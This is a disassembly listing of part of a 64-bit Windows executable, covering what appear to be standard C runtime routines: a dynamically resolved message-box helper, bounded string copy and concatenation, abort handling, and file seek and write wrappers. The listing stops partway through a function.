   140006bdb:	c7 05 bb fb 00 00 01 	movl   $0x1,0xfbbb(%rip)        # 0x1400167a0
   140006be2:	00 00 00 
   140006be5:	33 c0                	xor    %eax,%eax
   140006be7:	48 83 c4 28          	add    $0x28,%rsp
   140006beb:	c3                   	ret
   140006bec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006bf1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006bf6:	56                   	push   %rsi
   140006bf7:	57                   	push   %rdi
   140006bf8:	41 54                	push   %r12
   140006bfa:	41 55                	push   %r13
   140006bfc:	41 56                	push   %r14
   140006bfe:	48 83 ec 40          	sub    $0x40,%rsp
   140006c02:	41 8b e8             	mov    %r8d,%ebp
   140006c05:	4c 8b ea             	mov    %rdx,%r13
   140006c08:	4c 8b f1             	mov    %rcx,%r14
   140006c0b:	e8 8c c8 ff ff       	call   0x14000349c
   140006c10:	33 db                	xor    %ebx,%ebx
   140006c12:	48 8b f8             	mov    %rax,%rdi
   140006c15:	48 39 1d 1c e7 00 00 	cmp    %rbx,0xe71c(%rip)        # 0x140015338
   140006c1c:	0f 85 d0 00 00 00    	jne    0x140006cf2
   140006c22:	48 8d 0d 47 89 00 00 	lea    0x8947(%rip),%rcx        # 0x14000f570
   140006c29:	ff 15 d1 73 00 00    	call   *0x73d1(%rip)        # 0x14000e000
   140006c2f:	48 8b f0             	mov    %rax,%rsi
   140006c32:	48 85 c0             	test   %rax,%rax
   140006c35:	0f 84 8c 01 00 00    	je     0x140006dc7
   140006c3b:	48 8d 15 1e 89 00 00 	lea    0x891e(%rip),%rdx        # 0x14000f560
   140006c42:	48 8b c8             	mov    %rax,%rcx
   140006c45:	ff 15 bd 73 00 00    	call   *0x73bd(%rip)        # 0x14000e008
   140006c4b:	48 85 c0             	test   %rax,%rax
   140006c4e:	0f 84 73 01 00 00    	je     0x140006dc7
   140006c54:	48 8b c8             	mov    %rax,%rcx
   140006c57:	e8 38 c8 ff ff       	call   0x140003494
   140006c5c:	48 8d 15 ed 88 00 00 	lea    0x88ed(%rip),%rdx        # 0x14000f550
   140006c63:	48 8b ce             	mov    %rsi,%rcx
   140006c66:	48 89 05 cb e6 00 00 	mov    %rax,0xe6cb(%rip)        # 0x140015338
   140006c6d:	ff 15 95 73 00 00    	call   *0x7395(%rip)        # 0x14000e008
   140006c73:	48 8b c8             	mov    %rax,%rcx
   140006c76:	e8 19 c8 ff ff       	call   0x140003494
   140006c7b:	48 8d 15 b6 88 00 00 	lea    0x88b6(%rip),%rdx        # 0x14000f538
   140006c82:	48 8b ce             	mov    %rsi,%rcx
   140006c85:	48 89 05 b4 e6 00 00 	mov    %rax,0xe6b4(%rip)        # 0x140015340
   140006c8c:	ff 15 76 73 00 00    	call   *0x7376(%rip)        # 0x14000e008
   140006c92:	48 8b c8             	mov    %rax,%rcx
   140006c95:	e8 fa c7 ff ff       	call   0x140003494
   140006c9a:	48 8d 15 77 88 00 00 	lea    0x8877(%rip),%rdx        # 0x14000f518
   140006ca1:	48 8b ce             	mov    %rsi,%rcx
   140006ca4:	48 89 05 9d e6 00 00 	mov    %rax,0xe69d(%rip)        # 0x140015348
   140006cab:	ff 15 57 73 00 00    	call   *0x7357(%rip)        # 0x14000e008
   140006cb1:	48 8b c8             	mov    %rax,%rcx
   140006cb4:	e8 db c7 ff ff       	call   0x140003494
   140006cb9:	4c 8b d8             	mov    %rax,%r11
   140006cbc:	48 89 05 95 e6 00 00 	mov    %rax,0xe695(%rip)        # 0x140015358
   140006cc3:	48 85 c0             	test   %rax,%rax
   140006cc6:	74 21                	je     0x140006ce9
   140006cc8:	48 8d 15 31 88 00 00 	lea    0x8831(%rip),%rdx        # 0x14000f500
   140006ccf:	48 8b ce             	mov    %rsi,%rcx
   140006cd2:	ff 15 30 73 00 00    	call   *0x7330(%rip)        # 0x14000e008
   140006cd8:	48 8b c8             	mov    %rax,%rcx
   140006cdb:	e8 b4 c7 ff ff       	call   0x140003494
   140006ce0:	48 89 05 69 e6 00 00 	mov    %rax,0xe669(%rip)        # 0x140015350
   140006ce7:	eb 10                	jmp    0x140006cf9
   140006ce9:	48 8b 05 60 e6 00 00 	mov    0xe660(%rip),%rax        # 0x140015350
   140006cf0:	eb 0e                	jmp    0x140006d00
   140006cf2:	48 8b 05 57 e6 00 00 	mov    0xe657(%rip),%rax        # 0x140015350
   140006cf9:	4c 8b 1d 58 e6 00 00 	mov    0xe658(%rip),%r11        # 0x140015358
   140006d00:	48 3b c7             	cmp    %rdi,%rax
   140006d03:	74 63                	je     0x140006d68
   140006d05:	4c 3b df             	cmp    %rdi,%r11
   140006d08:	74 5e                	je     0x140006d68
   140006d0a:	48 8b c8             	mov    %rax,%rcx
   140006d0d:	e8 96 c7 ff ff       	call   0x1400034a8
   140006d12:	48 8b 0d 3f e6 00 00 	mov    0xe63f(%rip),%rcx        # 0x140015358
   140006d19:	48 8b f0             	mov    %rax,%rsi
   140006d1c:	e8 87 c7 ff ff       	call   0x1400034a8
   140006d21:	4c 8b e0             	mov    %rax,%r12
   140006d24:	48 85 f6             	test   %rsi,%rsi
   140006d27:	74 3f                	je     0x140006d68
   140006d29:	48 85 c0             	test   %rax,%rax
   140006d2c:	74 3a                	je     0x140006d68
   140006d2e:	ff d6                	call   *%rsi
   140006d30:	48 85 c0             	test   %rax,%rax
   140006d33:	74 2d                	je     0x140006d62
   140006d35:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140006d3c:	00 
   140006d3d:	41 b9 0c 00 00 00    	mov    $0xc,%r9d
   140006d43:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140006d48:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006d4d:	41 8d 51 f5          	lea    -0xb(%r9),%edx
   140006d51:	48 8b c8             	mov    %rax,%rcx
   140006d54:	41 ff d4             	call   *%r12
   140006d57:	85 c0                	test   %eax,%eax
   140006d59:	74 07                	je     0x140006d62
   140006d5b:	f6 44 24 38 01       	testb  $0x1,0x38(%rsp)
   140006d60:	75 06                	jne    0x140006d68
   140006d62:	0f ba ed 15          	bts    $0x15,%ebp
   140006d66:	eb 3e                	jmp    0x140006da6
   140006d68:	48 8b 0d d1 e5 00 00 	mov    0xe5d1(%rip),%rcx        # 0x140015340
   140006d6f:	48 3b cf             	cmp    %rdi,%rcx
   140006d72:	74 32                	je     0x140006da6
   140006d74:	e8 2f c7 ff ff       	call   0x1400034a8
   140006d79:	48 85 c0             	test   %rax,%rax
   140006d7c:	74 28                	je     0x140006da6
   140006d7e:	ff d0                	call   *%rax
   140006d80:	48 8b d8             	mov    %rax,%rbx
   140006d83:	48 85 c0             	test   %rax,%rax
   140006d86:	74 1e                	je     0x140006da6
   140006d88:	48 8b 0d b9 e5 00 00 	mov    0xe5b9(%rip),%rcx        # 0x140015348
   140006d8f:	48 3b cf             	cmp    %rdi,%rcx
   140006d92:	74 12                	je     0x140006da6
   140006d94:	e8 0f c7 ff ff       	call   0x1400034a8
   140006d99:	48 85 c0             	test   %rax,%rax
   140006d9c:	74 08                	je     0x140006da6
   140006d9e:	48 8b cb             	mov    %rbx,%rcx
   140006da1:	ff d0                	call   *%rax
   140006da3:	48 8b d8             	mov    %rax,%rbx
   140006da6:	48 8b 0d 8b e5 00 00 	mov    0xe58b(%rip),%rcx        # 0x140015338
   140006dad:	e8 f6 c6 ff ff       	call   0x1400034a8
   140006db2:	48 85 c0             	test   %rax,%rax
   140006db5:	74 10                	je     0x140006dc7
   140006db7:	44 8b cd             	mov    %ebp,%r9d
   140006dba:	4d 8b c5             	mov    %r13,%r8
   140006dbd:	49 8b d6             	mov    %r14,%rdx
   140006dc0:	48 8b cb             	mov    %rbx,%rcx
   140006dc3:	ff d0                	call   *%rax
   140006dc5:	eb 02                	jmp    0x140006dc9
   140006dc7:	33 c0                	xor    %eax,%eax
   140006dc9:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140006dce:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   140006dd3:	48 83 c4 40          	add    $0x40,%rsp
   140006dd7:	41 5e                	pop    %r14
   140006dd9:	41 5d                	pop    %r13
   140006ddb:	41 5c                	pop    %r12
   140006ddd:	5f                   	pop    %rdi
   140006dde:	5e                   	pop    %rsi
   140006ddf:	c3                   	ret
   140006de0:	40 53                	rex push %rbx
   140006de2:	48 83 ec 30          	sub    $0x30,%rsp
   140006de6:	4c 8b c9             	mov    %rcx,%r9
   140006de9:	48 85 c9             	test   %rcx,%rcx
   140006dec:	74 0d                	je     0x140006dfb
   140006dee:	48 85 d2             	test   %rdx,%rdx
   140006df1:	74 08                	je     0x140006dfb
   140006df3:	4d 85 c0             	test   %r8,%r8
   140006df6:	75 2c                	jne    0x140006e24
   140006df8:	44 88 01             	mov    %r8b,(%rcx)
   140006dfb:	e8 a4 c2 ff ff       	call   0x1400030a4
   140006e00:	bb 16 00 00 00       	mov    $0x16,%ebx
   140006e05:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006e0b:	45 33 c9             	xor    %r9d,%r9d
   140006e0e:	45 33 c0             	xor    %r8d,%r8d
   140006e11:	33 d2                	xor    %edx,%edx
   140006e13:	33 c9                	xor    %ecx,%ecx
   140006e15:	89 18                	mov    %ebx,(%rax)
   140006e17:	e8 b8 c1 ff ff       	call   0x140002fd4
   140006e1c:	8b c3                	mov    %ebx,%eax
   140006e1e:	48 83 c4 30          	add    $0x30,%rsp
   140006e22:	5b                   	pop    %rbx
   140006e23:	c3                   	ret
   140006e24:	80 39 00             	cmpb   $0x0,(%rcx)
   140006e27:	74 09                	je     0x140006e32
   140006e29:	48 ff c1             	inc    %rcx
   140006e2c:	48 83 ea 01          	sub    $0x1,%rdx
   140006e30:	75 f2                	jne    0x140006e24
   140006e32:	48 85 d2             	test   %rdx,%rdx
   140006e35:	75 05                	jne    0x140006e3c
   140006e37:	41 88 11             	mov    %dl,(%r9)
   140006e3a:	eb bf                	jmp    0x140006dfb
   140006e3c:	41 8a 00             	mov    (%r8),%al
   140006e3f:	49 ff c0             	inc    %r8
   140006e42:	88 01                	mov    %al,(%rcx)
   140006e44:	48 ff c1             	inc    %rcx
   140006e47:	84 c0                	test   %al,%al
   140006e49:	74 06                	je     0x140006e51
   140006e4b:	48 83 ea 01          	sub    $0x1,%rdx
   140006e4f:	75 eb                	jne    0x140006e3c
   140006e51:	48 85 d2             	test   %rdx,%rdx
   140006e54:	75 0f                	jne    0x140006e65
   140006e56:	41 88 11             	mov    %dl,(%r9)
   140006e59:	e8 46 c2 ff ff       	call   0x1400030a4
   140006e5e:	bb 22 00 00 00       	mov    $0x22,%ebx
   140006e63:	eb a0                	jmp    0x140006e05
   140006e65:	33 c0                	xor    %eax,%eax
   140006e67:	eb b5                	jmp    0x140006e1e
   140006e69:	cc                   	int3
   140006e6a:	cc                   	int3
   140006e6b:	cc                   	int3
   140006e6c:	40 53                	rex push %rbx
   140006e6e:	48 83 ec 30          	sub    $0x30,%rsp
   140006e72:	4d 8b d8             	mov    %r8,%r11
   140006e75:	4d 85 c9             	test   %r9,%r9
   140006e78:	75 0e                	jne    0x140006e88
   140006e7a:	48 85 c9             	test   %rcx,%rcx
   140006e7d:	75 0e                	jne    0x140006e8d
   140006e7f:	48 85 d2             	test   %rdx,%rdx
   140006e82:	75 20                	jne    0x140006ea4
   140006e84:	33 c0                	xor    %eax,%eax
   140006e86:	eb 3f                	jmp    0x140006ec7
   140006e88:	48 85 c9             	test   %rcx,%rcx
   140006e8b:	74 17                	je     0x140006ea4
   140006e8d:	48 85 d2             	test   %rdx,%rdx
   140006e90:	74 12                	je     0x140006ea4
   140006e92:	4d 85 c9             	test   %r9,%r9
   140006e95:	75 05                	jne    0x140006e9c
   140006e97:	44 88 09             	mov    %r9b,(%rcx)
   140006e9a:	eb e8                	jmp    0x140006e84
   140006e9c:	4d 85 c0             	test   %r8,%r8
   140006e9f:	75 2c                	jne    0x140006ecd
   140006ea1:	44 88 01             	mov    %r8b,(%rcx)
   140006ea4:	e8 fb c1 ff ff       	call   0x1400030a4
   140006ea9:	bb 16 00 00 00       	mov    $0x16,%ebx
   140006eae:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006eb4:	45 33 c9             	xor    %r9d,%r9d
   140006eb7:	45 33 c0             	xor    %r8d,%r8d
   140006eba:	33 d2                	xor    %edx,%edx
   140006ebc:	33 c9                	xor    %ecx,%ecx
   140006ebe:	89 18                	mov    %ebx,(%rax)
   140006ec0:	e8 0f c1 ff ff       	call   0x140002fd4
   140006ec5:	8b c3                	mov    %ebx,%eax
   140006ec7:	48 83 c4 30          	add    $0x30,%rsp
   140006ecb:	5b                   	pop    %rbx
   140006ecc:	c3                   	ret
   140006ecd:	4c 8b d1             	mov    %rcx,%r10
   140006ed0:	4c 8b c2             	mov    %rdx,%r8
   140006ed3:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140006ed7:	75 18                	jne    0x140006ef1
   140006ed9:	41 8a 03             	mov    (%r11),%al
   140006edc:	49 ff c3             	inc    %r11
   140006edf:	41 88 02             	mov    %al,(%r10)
   140006ee2:	49 ff c2             	inc    %r10
   140006ee5:	84 c0                	test   %al,%al
   140006ee7:	74 2c                	je     0x140006f15
   140006ee9:	49 83 e8 01          	sub    $0x1,%r8
   140006eed:	75 ea                	jne    0x140006ed9
   140006eef:	eb 24                	jmp    0x140006f15
   140006ef1:	41 8a 03             	mov    (%r11),%al
   140006ef4:	49 ff c3             	inc    %r11
   140006ef7:	41 88 02             	mov    %al,(%r10)
   140006efa:	49 ff c2             	inc    %r10
   140006efd:	84 c0                	test   %al,%al
   140006eff:	74 0c                	je     0x140006f0d
   140006f01:	49 83 e8 01          	sub    $0x1,%r8
   140006f05:	74 06                	je     0x140006f0d
   140006f07:	49 83 e9 01          	sub    $0x1,%r9
   140006f0b:	75 e4                	jne    0x140006ef1
   140006f0d:	4d 85 c9             	test   %r9,%r9
   140006f10:	75 03                	jne    0x140006f15
   140006f12:	45 88 0a             	mov    %r9b,(%r10)
   140006f15:	4d 85 c0             	test   %r8,%r8
   140006f18:	0f 85 66 ff ff ff    	jne    0x140006e84
   140006f1e:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140006f22:	75 0b                	jne    0x140006f2f
   140006f24:	44 88 44 11 ff       	mov    %r8b,-0x1(%rcx,%rdx,1)
   140006f29:	41 8d 40 50          	lea    0x50(%r8),%eax
   140006f2d:	eb 98                	jmp    0x140006ec7
   140006f2f:	c6 01 00             	movb   $0x0,(%rcx)
   140006f32:	e8 6d c1 ff ff       	call   0x1400030a4
   140006f37:	bb 22 00 00 00       	mov    $0x22,%ebx
   140006f3c:	e9 6d ff ff ff       	jmp    0x140006eae
   140006f41:	cc                   	int3
   140006f42:	cc                   	int3
   140006f43:	cc                   	int3
   140006f44:	48 83 ec 38          	sub    $0x38,%rsp
   140006f48:	85 c9                	test   %ecx,%ecx
   140006f4a:	78 20                	js     0x140006f6c
   140006f4c:	83 f9 02             	cmp    $0x2,%ecx
   140006f4f:	7e 0d                	jle    0x140006f5e
   140006f51:	83 f9 03             	cmp    $0x3,%ecx
   140006f54:	75 16                	jne    0x140006f6c
   140006f56:	8b 05 cc d6 00 00    	mov    0xd6cc(%rip),%eax        # 0x140014628
   140006f5c:	eb 31                	jmp    0x140006f8f
   140006f5e:	8b 05 c4 d6 00 00    	mov    0xd6c4(%rip),%eax        # 0x140014628
   140006f64:	89 0d be d6 00 00    	mov    %ecx,0xd6be(%rip)        # 0x140014628
   140006f6a:	eb 23                	jmp    0x140006f8f
   140006f6c:	e8 33 c1 ff ff       	call   0x1400030a4
   140006f71:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006f77:	45 33 c9             	xor    %r9d,%r9d
   140006f7a:	45 33 c0             	xor    %r8d,%r8d
   140006f7d:	33 d2                	xor    %edx,%edx
   140006f7f:	33 c9                	xor    %ecx,%ecx
   140006f81:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006f87:	e8 48 c0 ff ff       	call   0x140002fd4
   140006f8c:	83 c8 ff             	or     $0xffffffff,%eax
   140006f8f:	48 83 c4 38          	add    $0x38,%rsp
   140006f93:	c3                   	ret
   140006f94:	b9 02 00 00 00       	mov    $0x2,%ecx
   140006f99:	e9 e6 af ff ff       	jmp    0x140001f84
   140006f9e:	cc                   	int3
   140006f9f:	cc                   	int3
   140006fa0:	48 81 ec a8 05 00 00 	sub    $0x5a8,%rsp
   140006fa7:	f6 05 92 cd 00 00 01 	testb  $0x1,0xcd92(%rip)        # 0x140013d40
   140006fae:	74 0a                	je     0x140006fba
   140006fb0:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140006fb5:	e8 36 c8 ff ff       	call   0x1400037f0
   140006fba:	e8 61 d2 ff ff       	call   0x140004220
   140006fbf:	48 85 c0             	test   %rax,%rax
   140006fc2:	74 0a                	je     0x140006fce
   140006fc4:	b9 16 00 00 00       	mov    $0x16,%ecx
   140006fc9:	e8 5e d2 ff ff       	call   0x14000422c
   140006fce:	f6 05 6b cd 00 00 02 	testb  $0x2,0xcd6b(%rip)        # 0x140013d40
   140006fd5:	74 5f                	je     0x140007036
   140006fd7:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   140006fde:	00 
   140006fdf:	ff 15 5b 71 00 00    	call   *0x715b(%rip)        # 0x14000e140
   140006fe5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006fea:	33 d2                	xor    %edx,%edx
   140006fec:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140006ff2:	e8 79 ba ff ff       	call   0x140002a70
   140006ff7:	48 8b 84 24 a8 05 00 	mov    0x5a8(%rsp),%rax
   140006ffe:	00 
   140006fff:	33 c9                	xor    %ecx,%ecx
   140007001:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140007006:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000700b:	c7 44 24 30 15 00 00 	movl   $0x40000015,0x30(%rsp)
   140007012:	40 
   140007013:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007018:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   14000701f:	00 
   140007020:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007025:	ff 15 f5 70 00 00    	call   *0x70f5(%rip)        # 0x14000e120
   14000702b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007030:	ff 15 e2 70 00 00    	call   *0x70e2(%rip)        # 0x14000e118
   140007036:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000703b:	e8 98 b2 ff ff       	call   0x1400022d8
   140007040:	cc                   	int3
   140007041:	cc                   	int3
   140007042:	cc                   	int3
   140007043:	cc                   	int3
   140007044:	40 53                	rex push %rbx
   140007046:	48 83 ec 20          	sub    $0x20,%rsp
   14000704a:	45 8b 18             	mov    (%r8),%r11d
   14000704d:	48 8b da             	mov    %rdx,%rbx
   140007050:	4c 8b c9             	mov    %rcx,%r9
   140007053:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140007057:	41 f6 00 04          	testb  $0x4,(%r8)
   14000705b:	4c 8b d1             	mov    %rcx,%r10
   14000705e:	74 13                	je     0x140007073
   140007060:	41 8b 40 08          	mov    0x8(%r8),%eax
   140007064:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140007068:	f7 d8                	neg    %eax
   14000706a:	4c 03 d1             	add    %rcx,%r10
   14000706d:	48 63 c8             	movslq %eax,%rcx
   140007070:	4c 23 d1             	and    %rcx,%r10
   140007073:	49 63 c3             	movslq %r11d,%rax
   140007076:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000707a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000707e:	8b 48 08             	mov    0x8(%rax),%ecx
   140007081:	48 03 4b 08          	add    0x8(%rbx),%rcx
   140007085:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   140007089:	74 0c                	je     0x140007097
   14000708b:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   14000708f:	83 e0 f0             	and    $0xfffffff0,%eax
   140007092:	48 98                	cltq
   140007094:	4c 03 c8             	add    %rax,%r9
   140007097:	4c 33 ca             	xor    %rdx,%r9
   14000709a:	49 8b c9             	mov    %r9,%rcx
   14000709d:	48 83 c4 20          	add    $0x20,%rsp
   1400070a1:	5b                   	pop    %rbx
   1400070a2:	e9 99 a9 ff ff       	jmp    0x140001a40
   1400070a7:	cc                   	int3
   1400070a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400070ac:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1400070b0:	48 8b ca             	mov    %rdx,%rcx
   1400070b3:	49 8b d1             	mov    %r9,%rdx
   1400070b6:	e8 89 ff ff ff       	call   0x140007044
   1400070bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400070c0:	48 83 c4 28          	add    $0x28,%rsp
   1400070c4:	c3                   	ret
   1400070c5:	cc                   	int3
   1400070c6:	cc                   	int3
   1400070c7:	cc                   	int3
   1400070c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400070cd:	57                   	push   %rdi
   1400070ce:	48 83 ec 20          	sub    $0x20,%rsp
   1400070d2:	48 63 d9             	movslq %ecx,%rbx
   1400070d5:	41 8b f8             	mov    %r8d,%edi
   1400070d8:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400070dd:	8b cb                	mov    %ebx,%ecx
   1400070df:	e8 08 24 00 00       	call   0x1400094ec
   1400070e4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400070e8:	75 11                	jne    0x1400070fb
   1400070ea:	e8 b5 bf ff ff       	call   0x1400030a4
   1400070ef:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400070f5:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400070f9:	eb 57                	jmp    0x140007152
   1400070fb:	8b 54 24 38          	mov    0x38(%rsp),%edx
   1400070ff:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   140007104:	44 8b cf             	mov    %edi,%r9d
   140007107:	48 8b c8             	mov    %rax,%rcx
   14000710a:	ff 15 60 71 00 00    	call   *0x7160(%rip)        # 0x14000e270
   140007110:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007114:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007117:	75 13                	jne    0x14000712c
   140007119:	ff 15 31 6f 00 00    	call   *0x6f31(%rip)        # 0x14000e050
   14000711f:	85 c0                	test   %eax,%eax
   140007121:	74 09                	je     0x14000712c
   140007123:	8b c8                	mov    %eax,%ecx
   140007125:	e8 ba bf ff ff       	call   0x1400030e4
   14000712a:	eb c9                	jmp    0x1400070f5
   14000712c:	48 8b cb             	mov    %rbx,%rcx
   14000712f:	48 8b c3             	mov    %rbx,%rax
   140007132:	48 8d 15 47 f4 00 00 	lea    0xf447(%rip),%rdx        # 0x140016580
   140007139:	48 c1 f8 05          	sar    $0x5,%rax
   14000713d:	83 e1 1f             	and    $0x1f,%ecx
   140007140:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140007144:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140007148:	80 64 08 08 fd       	andb   $0xfd,0x8(%rax,%rcx,1)
   14000714d:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140007152:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007157:	48 83 c4 20          	add    $0x20,%rsp
   14000715b:	5f                   	pop    %rdi
   14000715c:	c3                   	ret
   14000715d:	cc                   	int3
   14000715e:	cc                   	int3
   14000715f:	cc                   	int3
   140007160:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007165:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000716a:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000716e:	57                   	push   %rdi
   14000716f:	41 54                	push   %r12
   140007171:	41 55                	push   %r13
   140007173:	41 56                	push   %r14
   140007175:	41 57                	push   %r15
   140007177:	48 83 ec 30          	sub    $0x30,%rsp
   14000717b:	45 8b e0             	mov    %r8d,%r12d
   14000717e:	4c 8b ea             	mov    %rdx,%r13
   140007181:	48 63 d9             	movslq %ecx,%rbx
   140007184:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140007187:	75 1d                	jne    0x1400071a6
   140007189:	e8 36 bf ff ff       	call   0x1400030c4
   14000718e:	33 ff                	xor    %edi,%edi
   140007190:	89 38                	mov    %edi,(%rax)
   140007192:	e8 0d bf ff ff       	call   0x1400030a4
   140007197:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000719d:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400071a1:	e9 d9 00 00 00       	jmp    0x14000727f
   1400071a6:	33 ff                	xor    %edi,%edi
   1400071a8:	3b df                	cmp    %edi,%ebx
   1400071aa:	0f 8c a5 00 00 00    	jl     0x140007255
   1400071b0:	3b 1d b2 f3 00 00    	cmp    0xf3b2(%rip),%ebx        # 0x140016568
   1400071b6:	0f 83 99 00 00 00    	jae    0x140007255
   1400071bc:	48 8b f3             	mov    %rbx,%rsi
   1400071bf:	4c 8b f3             	mov    %rbx,%r14
   1400071c2:	49 c1 fe 05          	sar    $0x5,%r14
   1400071c6:	4c 8d 3d b3 f3 00 00 	lea    0xf3b3(%rip),%r15        # 0x140016580
   1400071cd:	83 e6 1f             	and    $0x1f,%esi
   1400071d0:	48 6b f6 58          	imul   $0x58,%rsi,%rsi
   1400071d4:	4b 8b 04 f7          	mov    (%r15,%r14,8),%rax
   1400071d8:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   1400071dd:	83 e1 01             	and    $0x1,%ecx
   1400071e0:	75 2c                	jne    0x14000720e
   1400071e2:	e8 dd be ff ff       	call   0x1400030c4
   1400071e7:	89 38                	mov    %edi,(%rax)
   1400071e9:	e8 b6 be ff ff       	call   0x1400030a4
   1400071ee:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400071f4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400071f9:	45 33 c9             	xor    %r9d,%r9d
   1400071fc:	45 33 c0             	xor    %r8d,%r8d
   1400071ff:	33 d2                	xor    %edx,%edx
   140007201:	33 c9                	xor    %ecx,%ecx
   140007203:	e8 cc bd ff ff       	call   0x140002fd4
   140007208:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000720c:	eb 71                	jmp    0x14000727f
   14000720e:	8b cb                	mov    %ebx,%ecx
   140007210:	e8 5b 23 00 00       	call   0x140009570
   140007215:	90                   	nop
   140007216:	4b 8b 04 f7          	mov    (%r15,%r14,8),%rax
   14000721a:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   14000721f:	74 12                	je     0x140007233
   140007221:	45 8b c4             	mov    %r12d,%r8d
   140007224:	49 8b d5             	mov    %r13,%rdx
   140007227:	8b cb                	mov    %ebx,%ecx
   140007229:	e8 9a fe ff ff       	call   0x1400070c8
   14000722e:	48 8b f8             	mov    %rax,%rdi
   140007231:	eb 16                	jmp    0x140007249
   140007233:	e8 6c be ff ff       	call   0x1400030a4
   140007238:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000723e:	e8 81 be ff ff       	call   0x1400030c4
   140007243:	89 38                	mov    %edi,(%rax)
   140007245:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140007249:	8b cb                	mov    %ebx,%ecx
   14000724b:	e8 c8 23 00 00       	call   0x140009618
   140007250:	48 8b c7             	mov    %rdi,%rax
   140007253:	eb 2a                	jmp    0x14000727f
   140007255:	e8 6a be ff ff       	call   0x1400030c4
   14000725a:	89 38                	mov    %edi,(%rax)
   14000725c:	e8 43 be ff ff       	call   0x1400030a4
   140007261:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007267:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000726c:	45 33 c9             	xor    %r9d,%r9d
   14000726f:	45 33 c0             	xor    %r8d,%r8d
   140007272:	33 d2                	xor    %edx,%edx
   140007274:	33 c9                	xor    %ecx,%ecx
   140007276:	e8 59 bd ff ff       	call   0x140002fd4
   14000727b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000727f:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007284:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140007289:	48 83 c4 30          	add    $0x30,%rsp
   14000728d:	41 5f                	pop    %r15
   14000728f:	41 5e                	pop    %r14
   140007291:	41 5d                	pop    %r13
   140007293:	41 5c                	pop    %r12
   140007295:	5f                   	pop    %rdi
   140007296:	c3                   	ret
   140007297:	cc                   	int3
   140007298:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000729d:	55                   	push   %rbp
   14000729e:	56                   	push   %rsi
   14000729f:	57                   	push   %rdi
   1400072a0:	41 54                	push   %r12
   1400072a2:	41 55                	push   %r13
   1400072a4:	41 56                	push   %r14
   1400072a6:	41 57                	push   %r15
   1400072a8:	b8 30 1b 00 00       	mov    $0x1b30,%eax
   1400072ad:	e8 ee 4f 00 00       	call   0x14000c2a0
   1400072b2:	48 2b e0             	sub    %rax,%rsp
   1400072b5:	48 8b 05 8c bd 00 00 	mov    0xbd8c(%rip),%rax        # 0x140013048
   1400072bc:	48 33 c4             	xor    %rsp,%rax
   1400072bf:	48 89 84 24 20 1b 00 	mov    %rax,0x1b20(%rsp)
   1400072c6:	00 
   1400072c7:	33 ed                	xor    %ebp,%ebp
   1400072c9:	33 ff                	xor    %edi,%edi
   1400072cb:	45 8b e8             	mov    %r8d,%r13d
   1400072ce:	4c 8b e2             	mov    %rdx,%r12
